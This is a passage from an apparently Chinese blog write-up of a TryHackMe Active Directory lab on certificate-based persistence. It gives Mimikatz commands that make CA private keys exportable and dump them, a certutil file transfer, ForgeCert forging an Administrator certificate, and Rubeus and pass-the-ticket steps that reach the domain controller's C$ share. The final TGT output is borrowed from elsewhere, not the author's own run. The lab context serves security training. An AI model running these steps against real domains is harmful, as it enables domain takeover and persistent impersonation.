    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">90</span>e157dae304ef429824a33d3a3ef91e
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2027</span> <span class="hljs-number">7</span>:<span class="hljs-number">08</span>:<span class="hljs-number">09</span> PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e 
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (<span class="hljs-number">0</span>)
        Type           : CNG Key (<span class="hljs-number">0</span>xffffffff)
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;  
        Key Container  : za-THMDC-CA
        Unique name    : <span class="hljs-number">8</span>d666f3049de45dee20c70510f66d2cf_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Algorithm      : RSA
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Export policy  : <span class="hljs-number">00000003</span> ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) 
        Exportable key : YES
        LSA isolation  : NO

 <span class="hljs-number">2</span>. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">03000000000057</span>c6f9be06e7c78d0300000010
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM 
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001) 
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-<span class="hljs-number">6606</span>-<span class="hljs-number">40</span>a3-a87a-f549bdcd757c
        |Unique name   : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX 
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO

 <span class="hljs-number">3</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">02000000000078856466521</span>a82570200000010
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA) 
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM
    Hash SHA1: <span class="hljs-number">0</span>d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>) 
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-<span class="hljs-number">21</span>e4d1ee-<span class="hljs-number">54</span>f7-<span class="hljs-number">4</span>ca5-b36b-b2cecff9a609
        |Unique name   : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;  
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO</code></pre>
<p>我们可以看到DC上有CA证书。我们还可以注意到，其中一些证书被设置为不允许我们导出密钥。如果没有这个私钥，我们将无法生成新的证书。幸运的是，Mimikatz 允许我们修补内存以使这些密钥可导出：</p>
<pre><code class="hljs scss">
mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
<span class="hljs-string">"KeyIso"</span> service patched</code></pre>
<p>如果您收到错误，请不要担心，这只是意味着其他人在您之前执行了该补丁。修补这些服务后，我们可以使用 Mimikatz 导出证书：</p>
<pre><code class="hljs scss">mimikatz # crypto::certificates /systemstore:local_machine /export 
 * System Store  : <span class="hljs-string">'local_machine'</span> (<span class="hljs-number">0</span>x00020000) 
 * Store         : <span class="hljs-string">'My'</span>

 <span class="hljs-number">0</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">040000000000703</span>a4d78090a0ab10400000010 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-<span class="hljs-number">5</span>ed52c94-<span class="hljs-number">34</span>e8-<span class="hljs-number">4450</span>-a751-a57ac55a110f 
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX 
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - <span class="hljs-string">'local_machine_My_0_.der'</span> 
        Private export : OK - <span class="hljs-string">'local_machine_My_0_.pfx'</span> 

 <span class="hljs-number">1</span>. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">90</span>e157dae304ef429824a33d3a3ef91e 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2027</span> <span class="hljs-number">7</span>:<span class="hljs-number">08</span>:<span class="hljs-number">09</span> PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e 
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (<span class="hljs-number">0</span>)
        Type           : CNG Key (<span class="hljs-number">0</span>xffffffff) 
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA 
        Unique name    : <span class="hljs-number">8</span>d666f3049de45dee20c70510f66d2cf_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Algorithm      : RSA
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Export policy  : <span class="hljs-number">00000003</span> ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) 
        Exportable key : YES
        LSA isolation  : NO 
        Public export  : OK - <span class="hljs-string">'local_machine_My_1_za-THMDC-CA.der'</span> 
        Private export : OK - <span class="hljs-string">'local_machine_My_1_za-THMDC-CA.pfx'</span> 

 <span class="hljs-number">2</span>. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">03000000000057</span>c6f9be06e7c78d0300000010
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA) 
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-<span class="hljs-number">6606</span>-<span class="hljs-number">40</span>a3-a87a-f549bdcd757c
        |Unique name   : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO
        Public export  : OK - <span class="hljs-string">'local_machine_My_2_THMDC.za.tryhackme.loc.der'</span>
        Private export : OK - <span class="hljs-string">'local_machine_My_2_THMDC.za.tryhackme.loc.pfx'</span> 

 <span class="hljs-number">3</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">02000000000078856466521</span>a82570200000010 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM
    Hash SHA1: <span class="hljs-number">0</span>d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-<span class="hljs-number">21</span>e4d1ee-<span class="hljs-number">54</span>f7-<span class="hljs-number">4</span>ca5-b36b-b2cecff9a609 
        |Unique name   : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO
        Public export  : OK - <span class="hljs-string">'local_machine_My_3_.der'</span>
        Private export : OK - <span class="hljs-string">'local_machine_My_3_.pfx'</span></code></pre>
<p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172601555.png" alt="image-20240226172601555"></p>
<p><code>za-THMDC-CA.pfx</code> 证书是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> 。使用 SCP 下载或复制此证书到您的 AttackBox，然后将其复制到 THMWRK1 上的低权限用户的主目录。如果您愿意，还可以在自己的未加入域的 Windows 计算机上执行其余步骤。</p>
<p>这里我不知为何我没有<code>za-THMDC-CA.pfx</code>证书，弄了半天是我ssh连接对象搞错了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226175500376.png" alt="image-20240226175500376"></p>
<h2 id="生成我们自己的证书">生成我们自己的证书</h2>
<p>现在我们有了私钥和根 CA 证书，我们可以使用 SpectorOps <a target="_blank" rel="noopener" href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> 工具为我们想要的任何用户伪造客户端身份验证证书。 ForgeCert 和 Rubeus 二进制文件存储在 THMWRK1 上的 C:\Tools\ 目录中。让我们使用 ForgeCert 生成一个新证书：</p>
<p>这里我们需要将上述的pfx文件传输到我们的attackbox上</p>
<pre><code class="hljs scss">scp Administrator<span class="hljs-keyword">@thmdc</span>.za.tryhackme.<span class="hljs-attribute">loc</span>:<span class="hljs-attribute">C</span>:/Users/Administrator/hybcx/local_machine_My_1_za-THMDC-CA.pfx .</code></pre>
<p>接着ssh连接该域环境的thmwrk计算机，将该pfx文件传输至该计算机上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194150775.png" alt="image-20240226194150775"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194157209.png" alt="image-20240226194157209"></p>
<pre><code class="hljs scss">certutil -urlcache -f http://<span class="hljs-number">10.50</span>.<span class="hljs-number">59.120</span>:<span class="hljs-number">8000</span>/za-THMDC-CA.pfx za-THMDC-CA.pfx</code></pre>
<p>接下来使用工具生成证书</p>
<pre><code class="hljs scss">C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath hybcx.pfx --NewCertPassword Password123</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194610334.png" alt></p>
<p>参数解释：</p>
<ul>
<li>CaCertPath - 我们导出的 CA 证书的路径。</li>
<li>CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> 。</li>
<li>Subject - 证书的主题或通用名称。对于我们使用证书的用途而言，这并不重要。</li>
<li>subjectAltName - 这是我们要使用此证书模拟的帐户的用户主体名称 (UPN)。它必须是合法用户。</li>
<li>NewCertPath - ForgeCert 将存储生成的证书的路径。</li>
<li>NewCertPassword - 由于证书需要导出私钥用于身份验证，因此我们必须设置一个用于加密它的新密码。</li>
</ul>
<p>我们可以使用 Rubeus 来使用证书请求 TGT，以验证证书是否可信。我们将使用以下命令：</p>
<pre><code class="hljs scss">C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:hybcx.pfx /password:Password123 /outfile:fullAdmin.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">10.200</span>.<span class="hljs-number">62.101</span></code></pre>
<p>我们来分解一下参数：</p>
<ul>
<li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 相匹配</li>
<li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致溢出警报</li>
<li>/certificate - 我们生成的证书的路径</li>
<li>/password - 我们的证书文件的密码</li>
<li>/outfile - TGT 将输出到的文件</li>
<li>/domain - 我们当前攻击的域的 FQDN</li>
<li>/dc - 我们请求 TGT 的域控制器的 IP。通常，最好选择运行CA服务的DC</li>
</ul>
<p>执行命令后，我们应该会收到 TGT：</p>
<p>但这里我总是报错，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240229185632633.png" alt="image-20240229185632633"></p>
<p>这里经过几篇文章的搜寻，该报错原因是由于其不支持padata类型，也就是该KDC没有设置kerberos身份验证。这里也是懵逼了，尝试几次都失败，感觉是环境问题，但刚重置了还是出错，不理解，就先放出成果图</p>
<pre><code class="hljs scss">za\aaron<span class="hljs-selector-class">.jones</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\aaron.jones&gt;<span class="hljs-attribute">C</span>:\Tools\Rubeus.exe asktgt /<span class="hljs-attribute">user</span>:Administrator /<span class="hljs-attribute">enctype</span>:aes256 /<span class="hljs-attribute">certificate</span>:vulncert.pfx /<span class="hljs-attribute">password</span>:tryhackme /<span class="hljs-attribute">outfile</span>:administrator.kirbi /<span class="hljs-attribute">domain</span>:za.tryhackme.loc /<span class="hljs-attribute">dc</span>:<span class="hljs-number">10.200</span>.x.<span class="hljs-number">101</span>
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.<span class="hljs-number">0.0</span>
       
       [*] <span class="hljs-attribute">Action</span>: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">subject</span>: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) <span class="hljs-attribute">for</span>: <span class="hljs-string">'za.tryhackme.loc\Administrator'</span>
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ
             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/
             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD
             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+<span class="hljs-number">7</span>DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr
             <span class="hljs-number">2</span>Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW
             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM
             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+<span class="hljs-number">0</span>qOZDtgaJZ/neRdRktYhTsGL39VHB5
             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/<span class="hljs-number">7</span>ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW
             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/<span class="hljs-number">6</span>NyLjiE9srbOt6hCLzUaOSMGH1Enf
             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF
             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/<span class="hljs-number">4</span>mEjbUN5qjNqejYdUb/b5xw
             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG
             CNdI1/lsICpS/jaK6NM/<span class="hljs-number">0</span>oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk
             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+
             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO
             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS
             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/<span class="hljs-number">2</span>r7ecyrVZIf2Qf0+ci9G
             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP
             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY
             <span class="hljs-number">5</span>K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
       
         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             :  za.tryhackme.loc
         UserName                 :  Administrator
         UserRealm                :  za.tryhackme.loc
         StartTime                :  <span class="hljs-number">2</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> PM
         EndTime                  :  <span class="hljs-number">2</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> AM
         RenewTill                :  <span class="hljs-number">2</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</code></pre>
<p>现在我们可以使用 Mimikatz 加载 TGT 并向 THMDC 进行身份验证：</p>
<pre><code class="hljs scss">C:\Tools\mimikatz_trunk\x64\mimikatz.exe

mimikatz # kerberos::ptt administrator.kirbi

dir \\THMDC.za.tryhackme.loc\c$\</code></pre>
<pre><code class="hljs scss">mimikatz # kerberos::ptt administrator.kirbi

* File: <span class="hljs-string">'administrator.kirbi'</span>: OK

mimikatz # exit
Bye! 

za\aaron.jones@THMWRK1 C:\Users\aaron.jones&gt;dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\THMDC.za.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">24</span> AM               <span class="hljs-number">154</span> dns_entries.csv
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">53</span> PM           <span class="hljs-number">885</span>,<span class="hljs-number">468</span> MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">31</span> PM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          Program Files (x86)
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">27</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">423</span> thm-network-setup-dc.ps1
